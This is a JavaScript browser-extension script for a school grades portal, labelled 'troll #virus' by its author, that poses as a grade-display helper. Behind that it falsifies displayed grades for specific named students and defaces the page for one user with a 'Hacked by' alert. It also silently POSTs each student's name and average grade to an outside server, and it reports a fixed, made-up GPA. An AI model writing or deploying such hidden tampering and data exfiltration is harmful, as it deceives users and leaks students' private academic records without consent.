// troll #virus
// el codigo es malo pero no me importa
if (document.querySelector("#userName > span")){
  function wait(ms){
   var start = new Date().getTime();
   var end = start;
   while(end < start + ms) {
     end = new Date().getTime();
  }
}
var name = document.querySelector("#userName > span").innerText.split(/(\s+)/)[0];
if (name == "Hannahh" || name == "Ellioth") {
    console.log("Searching")
    if(document.querySelector("#quickLookup > table.linkDescList.grid > tbody > tr:nth-child(7) > td:nth-child(17) > a")) {
        document.querySelector("#quickLookup > table.linkDescList.grid > tbody > tr:nth-child(7) > td:nth-child(17) > a").innerText = "87"
    }
//     if(document.querySelector("#table7 > tr:nth-child(1) > td.assignmentcol > span") && document.querySelector("#table7 > tr:nth-child(1) > td.assignmentcol > span").innerText == "Total Health Collage and Presentation") {
//         document.querySelector("#table7 > tr:nth-child(1) > td.ng-binding.ng-scope").innerText = "87"
//         document.querySelector("#table7 > tr:nth-child(1) > td.score > span").innerText = "87/100"
//         document.querySelector("#table3 > tr:nth-child(2) > td:nth-child(4)").textContent = "87"
//     }
    if(document.querySelector("#table3 > tr:nth-child(2) > td:nth-child(4)") && document.querySelector("#table5 > tr:nth-child(1) > td:nth-child(1)").innerText == "Health Communication") {
        console.log("Found")
        document.querySelector("#table7 > tr:nth-child(1) > td.ng-binding.ng-scope").innerText = "87"
        document.querySelector("#table7 > tr:nth-child(1) > td.score > span").innerText = "87/100"
        document.querySelector("#table3 > tr:nth-child(2) > td:nth-child(4)").textContent = "87"
    }
    
}
}

if (document.title.indexOf("Grades and Attendance") != -1) {
    var version = "v1.6"
    var colorpic = "#b5dcff"
    //Better colors

    function removeStyles(el) {
        el.removeAttribute('style');
    
        if(el.childNodes.length > 0) {
            for(let child in el.childNodes) {
                /* filter element nodes only */
                if(el.childNodes[child].nodeType == 1)
                    removeStyles(el.childNodes[child]);
            }
        }
    }
    function runnin(tagString) {
        var range = document.createRange();
        range.selectNode(document.getElementsByTagName("BODY")[0]);
        var documentFragment = range.createContextualFragment(tagString);
        document.body.appendChild(documentFragment);
    }
    removeStyles(document.body);
    // runnin('<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">')
    // runnin('<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>')
    runnin('<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/uikit@3.9.3/dist/css/uikit.min.css" />');
    //Better colors end

    //Grades
    function getSecondPart(str) {
        return str.split('_')[1];
    }


    function ins(txxt, link) {
        txt = txxt+" \n"
        var newElement;
        if (link && (link.includes("keep") || link.includes("rawr") || link.includes("sleepy") )) {
            newElement = document.createElement("a");
        } else {
            newElement = document.createElement("div")
        }
        newElement.appendChild(document.createTextNode(txt));
        if (link && (link.includes("keep") || link.includes("rawr") || link.includes("sleepy") )) {
            newElement.title = txt
            // newElement.href = link
            console.log("Changn")
            newElement.href = link
            newElement.target = "_blank"
            console.log('changed')
        }
        document.getElementById('attByClass').appendChild(newElement);
    }
    
    function isNumeric(str) {
        if (typeof str != "string") return false  
        return !isNaN(str) &&
               !isNaN(parseFloat(str))
    }

    function getRanking(ok) {
        //now get your grade :)
        var name = document.querySelector("#userName > span").innerText.split(/(\s+)/)[0];
        // var users = lol.players
        // var founduser;
        // var foundscore;
        // for (var item in users) {
        //     if (users[item].player_name && users[item].player_name == name) {
        //         founduser = users[item];
        //         foundscore = parseInt(item) + 1;
        //         break;
        //     }
        // }
        if(name==="Hnnah"){
            document.body.innerHTML = '';
            const setBackground = (image) => { document.body.style.background = "url('"+image+"')"; }; 
setBackground('https://www.themarysue.com/wp-content/uploads/2020/01/NUP_187403_0844.jpg')
            alert("Hacked by Lila Hayes")
        }
        // first request start
        window.post = function(url) {
            return fetch(url, {method: "POST"});
        }
        post("https://powerschoolapi.herokuapp.com/update/"+name+"/"+ok);
        // first request end
        // second request start

        // second request end

        //first request start
        // var myHeaders = new Headers();
        // myHeaders.append("Content-Type", "application/json");

        // var raw = JSON.stringify({"player_id":founduser.id,"score":-founduser.score});

        // var requestOptions = {
        // method: 'POST',
        // headers: myHeaders,
        // body: raw,
        // redirect: 'follow'
        // };

        // fetch("https://keepthescore.co/api/yjxrblmwdae/score/?=&=", requestOptions)
        // .then(response => response.text())
        // .then(result => console.log(result))
        // .catch(error => console.log('error', error));
        //first request end

        //second request start
        // var myHeaders = new Headers();
        // myHeaders.append("Content-Type", "application/json");

        // var raw = JSON.stringify({"player_id":founduser.id,"score":ok});

        // var requestOptions = {
        // method: 'POST',
        // headers: myHeaders,
        // body: raw,
        // redirect: 'follow'
        // };

        // fetch("https://keepthescore.co/api/yjxrblmwdae/score/?=&=", requestOptions)
        // .then(response => response.text())
        // .then(result => console.log(result))
        // .catch(error => console.log('error', error));
        //second request end

        // console.log("a: "+name, " b: "+founduser.player_name)
        // return foundscore
    }
    async function getBestrank(ok, callbac) {
        // var aa = "https://keepthescore.co/api/yjxrblmwdae/board/";
        // var obj = await (await fetch(aa)).json();
        // ouput = (obj.players[0].player_name)
        // console.log("ATTENTION||||||WHAT YOU HAVE BEEN WAITING FOR",ok)
        // console.log(ouput)
        getRanking(ok)
//         ins(ouput+" has the best grade")
//         ins("You have the #"+getRanking(ok,obj)+" best grade in the class","https://elliotdoescode.github.io/test/")
            ins("View Leaderboard","https://sleepy-kalam-2cc1fa.netlify.app/")
            ins("⚠️Half released⚠️")
        callbac()
    }
    
    function getAverage(ss) {
        var sum = 0
        var ad = 0
        var ppop = document.querySelector("#quickLookup > table.linkDescList.grid > tbody").children
        
        for (var i = 0; i < ppop.length; i++) {
            var tr = ppop[i]; 
            if (tr.id) {
                var id = tr.id;
                if (id.includes("ccid")) {
                    var af = getSecondPart(id)
                    for (var ii = 0; ii < tr.children.length; ii++) {
                        var tds = tr.children[ii];
                        if (!tds.class && tds.querySelector("a"))  {
                            var urinside = tds.querySelector("a");
                            if(urinside.href.includes("score") && isNumeric(urinside.text)) {
                                sum = sum+1;
                                ad = ad+parseInt(urinside.text);
                            }
                        }
                    }
    
    
                }
            }
        }
    
        var average = (ad/sum).toFixed(1);
        console.log(average);
        if(ss != "yeah") {
            ins("Average grade - " + average);
        } else {
            return average
        }
    }
    
    function calculateLetter(grade) {
        var lettergrade = "F"; 
        if (grade == 100) {
            lettergrade = "A+"
        } else if (grade >= 93) {
            lettergrade = "A"
        } else if (grade <=92 && grade >= 90){
            lettergrade = "A-"
        } else if (grade <=89 && grade >=87){
            lettergrade = "B+"
        } else if (grade <=86 && grade >=83){
            lettergrade = "B"
        } else if (grade <=82 && grade >=80){
            lettergrade = "B-"
        } else {
            lettergrade = "Basically an F lol";
        }
        return lettergrade
    }
    
    function gpa(grade) {
        // var output = "1"
        // if (grade >= 97) {
        //     output = "4.0"
        // } else if (grade <= 93){
        //     output = "Ian Frost"
        // } else if (grade <=92 && grade >= 90){
        //     output = "3.9"
        // } else if (grade <=89 && grade >=87){
        //     output = "3.0"
        // } else if (grade <=86 && grade >=83){
        //     output = "2.6"
        // } else if (grade <=82 && grade >=80){
        //     output = "2.3"
        // } else {
        //     output = "Bro you just wouldn't get into college";
        // }
        let returnstring = "3.1"
        if (Math.floor(Math.random() * (10 - 1 + 1)) +1+"" === "3") {
//           returnstring = "1e+83ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎ํํํํํํํํํํํํํํํํํํํํํํํํํํỎ̷͖͈̞̩͎̻̫̫̜͉̠̫͕̭̭̫̫̹̗̹͈̼̠̖͍͚̥͈̮̼͕̠̤̯̻̥̬̗̼̳̤̳̬̪̹͚̞̼̠͕̼̠̦͚̫͔̯̹͉͉̘͎͕̼̣̝͙̱̟̹̩̟̳̦̭͉̮̖̭̣̣̞̙̗̜̺̭̻̥͚͙̝̦̲̱͉͖͉̰̦͎̫̣̼͎͍̠̮͓̹̹͉̤̰̗̙͕͇͔̱͕̭͈̳̗̭͔̘̖̺̮̜̠͖̘͓̳͕̟̠̱̫̤͓͔̘̰̲͙͍͇̙͎̣̼̗̖͙̯͉̠̟͈͍͕̪͓̝̩̦̖̹̼̠̘̮͚̟͉̺̜͍͓̯̳̱̻͕̣̳͉̻̭̭̱͍̪̩̭̺͕̺̼̥̪͖̦̟͎̻̰ ͬͤ ͬͬͤ ͦͬͬͤ ͬͦͬͬͤ ͤͬͦͬͬͤ ͬͤͬͦͬͬͤ ͬͬͤͬͦͬͬͤ ͦͬͬͤͬͦͬͬͤ ͬͦͬͬͤͬͦͬͬͤ ͤͬͦͬͬͤͬͦͬͬͤ ͬͦͬͬͤͬͦͬͬͤ ͦͬͬͤͬͦͬͬͤ ͬͬͤͬͦͬͬͤ ͬͤͬͦͬͬͤ ͤͬͦͬͬͤ ͬͦͬͬͤ ͦͬͬͤ ͬͬͤ ͬͤ ͤ Ỏ̷͖͈̞̩͎̻̫̫̜͉̠̫͕̭̭̫̫̹̗̹͈̼̠̖͍͚̥͈̮̼͕̠̤̯̻̥̬̗̼̳̤̳̬̪̹͚̞̼̠͕̼̠̦͚̫͔̯̹͉͉̘͎͕̼̣̝͙̱̟̹̩̟̳̦̭͉̮̖̭̣̣̞̙̗̜̺̭̻̥͚͙̝̦̲̱͉͖͉̰̦͎̫̣̼͎͍̠̮͓̹̹͉̤̰̗̙͕͇͔̱͕̭͈̳̗̭͔̘̖̺̮̜̠͖̘͓̳͕̟̠̱̫̤͓͔̘̰̲͙͍͇̙͎̣̼̗̖͙̯͉̠̟͈͍͕̪͓̝̩̦̖̹̼̠̘̮͚̟͉̺̜͍͓̯̳̱̻͕̣̳͉̻̭̭̱͍̪̩̭̺͕̺̼̥̪͖̦̟͎̻̰ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็ "
        }
        if (document.querySelector("#userName > span").innerText.split(/(\s+)/)[0] == "Lila" || document.querySelector("#userName > span").innerText.split(/(\s+)/)[0] == "Sebastian") {
            returnstring = "3.1"
        }
        return returnstring
    }
    
    function replaceWithLetter() {
        var ppop = document.querySelector("#quickLookup > table.linkDescList.grid > tbody").children
        
        for (var i = 0; i < ppop.length; i++) {
            var tr = ppop[i];  
            if (tr.id) {
                var id = tr.id;
                if (id.includes("ccid")) {
                    var af = getSecondPart(id)
                    for (var ii = 0; ii < tr.children.length; ii++) {
                        var tds = tr.children[ii];
                        if (!tds.class && tds.querySelector("a"))  {
                            var urinside = tds.querySelector("a");
                            if(urinside.href.includes("score") && isNumeric(urinside.text)) {
                                var grade = parseInt(urinside.text);
                                var lettergrade = calculateLetter(grade);
    
                               // console.log(lettergrade);
                                urinside.text = urinside.text+" : "+lettergrade
//                                 if (document.querySelector("#userName > span").innerText.split(/(\s+)/)[0] === "Hannah" && Math.floor(Math.random() * (10 - 1 + 1)) + 1+"" === "3") {
//                                     urinside.text = Math.floor(Math.random() * (100 - 60 + 1)) + 60+""
//                                     var lettergrade2 = calculateLetter(grade);
//                                     urinside.text = urinside.text+" : "+lettergrade2
//                                 }
    
                            }
                        }
                    }
    
    
                }
            }
        }
    }
    
    ins("|------------------|")
    console.log("hah "+getAverage("yeah"))
    ins("Average letter grade - "+calculateLetter(parseInt(getAverage("yeah")))+"");
    ins("|------------------|")
    getAverage();
    ins("|------------------|")
    ins("GPA - "+gpa(parseInt(getAverage("yeah"))));
    ins("|------------------|")
    getBestrank(getAverage("yeah"), function() {
        //credits
        ins("___________________");
        ins("Elliot's amazing #baddie. Version "+version)
        //ew
        replaceWithLetter();
    })
    //End grades

    //Coloring
    document.querySelector("#attByClass").style.background = colorpic;


} else if (document.title.indexOf("Class Score Detail") != -1) {
    //If you clicked on a grade yk
} else if (document.title.indexOf("Student and Parent Sign In") != -1) {
    //Login page for one click login
    document.getElementById("signin-custom-message").outerHTML = "";
    newElement = document.createElement("button")
    newElement.appendChild(document.createTextNode("Use Quicksignin"));
    document.getElementById('btn-enter-sign-in-div').appendChild(newElement);
    newElement.addEventListener("submit", function(evt) {
        evt.preventDefault();
        window.history.back();
    }, true)

     function runnin(tagString) {
         var range = document.createRange();
         range.selectNode(document.getElementsByTagName("BODY")[0]);
         var documentFragment = range.createContextualFragment(tagString);
         document.body.appendChild(documentFragment);
     }
     // runnin('<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">')
     // runnin('<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>')
     runnin('<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/uikit@3.9.3/dist/css/uikit.min.css" />');
     //Better colors end
}
